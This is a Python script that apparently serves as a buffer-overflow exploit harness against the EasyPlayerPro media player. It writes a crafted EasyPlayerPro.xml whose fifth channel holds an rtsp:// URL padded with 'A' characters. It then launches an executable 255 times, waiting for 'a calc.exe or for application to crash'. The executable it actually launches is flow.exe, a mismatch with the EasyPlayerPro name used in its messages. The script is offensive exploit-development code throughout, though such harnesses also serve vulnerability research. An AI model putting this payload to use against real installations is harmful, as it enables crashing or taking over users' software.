import xml.etree.ElementTree as ET
import xml.dom.minidom as minidom
import os
import time


"""
Sample XML configuration file

<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<XMLConfig>
    <SplitWindow>4</SplitWindow>
    <Scale>0</Scale>
    <Multiple>1</Multiple>
    <FullScreen>0</FullScreen>
    <RecordingDuration>5</RecordingDuration>
    <AutoSegmentation>1</AutoSegmentation>
    <Channel>
        <CH No="1" URL="f://1.mp4" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="2" URL="http://mirror.aarnet.edu.au/pub/TED-talks/911Mothers_2010W-480p.mp4" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="3" URL="rtmp://live.hkstv.hk.lxdns.com/live/hks2" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="4" URL="http://live.hkstv.hk.lxdns.com/live/hks2/playlist.m3u8" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="5" URL="" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="6" URL="" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="7" URL="" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="8" URL="" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="9" URL="" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="10" URL="" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="11" URL="" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="12" URL="" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="13" URL="" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="14" URL="" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="15" URL="" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
        <CH No="16" URL="" OSD="1" Protocol="1" Cache="3" ShowToolbar="1" AutoPlay="0" />
    </Channel>
</XMLConfig>
"""


def generate_bof():
	return "\x41" * 20


def generate_payload():

	# Create the root element
	root = ET.Element('XMLConfig')

	# Add the 'SplitWindow' element
	split_window = ET.SubElement(root, 'SplitWindow')
	split_window.text = '4'

	# Add the 'Scale' element
	scale = ET.SubElement(root, 'Scale')
	scale.text = '0'

	# Add the 'Multiple' element
	multiple = ET.SubElement(root, 'Multiple')
	multiple.text = '1'

	# Add the 'FullScreen' element
	full_screen = ET.SubElement(root, 'FullScreen')
	full_screen.text = '0'

	# Add the 'RecordingDuration' element
	recording_duration = ET.SubElement(root, 'RecordingDuration')
	recording_duration.text = '5'

	# Add the 'AutoSegmentation' element
	auto_segmentation = ET.SubElement(root, 'AutoSegmentation')
	auto_segmentation.text = '1'

	# Add the 'Channel' element
	channel = ET.SubElement(root, 'Channel')

	_bof = generate_bof()

	# Add the child elements under 'Channel'
	channels_data = [
	    {"No": "1", "URL": "f://1.mp4", "OSD": "1", "Protocol": "1", "Cache": "3", "ShowToolbar": "1", "AutoPlay": "0"},
	    {"No": "2", "URL": "http://mirror.aarnet.edu.au/pub/TED-talks/911Mothers_2010W-480p.mp4", "OSD": "1", "Protocol": "1", "Cache": "3", "ShowToolbar": "1", "AutoPlay": "0"},
	    {"No": "3", "URL": "rtmp://live.hkstv.hk.lxdns.com/live/hks2", "OSD": "1", "Protocol": "1", "Cache": "3", "ShowToolbar": "1", "AutoPlay": "0"},
	    {"No": "4", "URL": "http://live.hkstv.hk.lxdns.com/live/hks2/playlist.m3u8", "OSD": "1", "Protocol": "1", "Cache": "3", "ShowToolbar": "1", "AutoPlay": "0"},
	    {"No": "5", "URL": f"rtsp://{_bof}", "OSD": "1", "Protocol": "1", "Cache": "3", "ShowToolbar": "1", "AutoPlay": "0"},	
	]

	for data in channels_data:
	    ch_element = ET.SubElement(channel, 'CH')
	    ch_element.set("No", data["No"])
	    ch_element.set("URL", data["URL"])
	    ch_element.set("OSD", data["OSD"])
	    ch_element.set("Protocol", data["Protocol"])
	    ch_element.set("Cache", data["Cache"])
	    ch_element.set("ShowToolbar", data["ShowToolbar"])
	    ch_element.set("AutoPlay", data["AutoPlay"])

	# Create the XML tree
	tree = ET.ElementTree(root)
	tree._setroot(root)

	# Convert the XML tree to a string
	xml_string = ET.tostring(root)
	indented_xml_string = xml_string

	# dom = minidom.parseString(xml_string.decode())
	# indented_xml_string = dom.toprettyxml(indent='    ')

	# lines = indented_xml_string.split('\n')
	# if lines[0].startswith('<?xml') and len(lines) > 1:
	# 	indented_xml_string = '\n'.join(lines[1:])

	# indented_xml_string = '\n'+indented_xml_string

	# Write the formatted XML string to a file
	with open('EasyPlayerPro.xml', 'wb') as xml_file:
		xml_declaration = b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
		xml_file.write(xml_declaration)
		xml_file.write(indented_xml_string)

	print("EasyPlayerPro.xml Payload Created!")


def execute_easyplayerpro():
	os.chdir('c:\\documents and settings\\flow_model')
	os.system('"C:\\Documents and Settings\\flow_model\\flow.exe"')


for i in range(0x1, 0xff+0x1):
	print(f"[*] Iteration {i}: Creating XML payload")
	generate_payload()
	print(f"[*] Iteration {i}: Done creating XML payload")	
	time.sleep(1)
	print(f"[*] Iteration {i}: Running EasyPlayerPro.exe")	
	execute_easyplayerpro()
	print(f"[*] Iteration {i}: Wait for a calc.exe or for application to crash...")	
	time.sleep(12)	
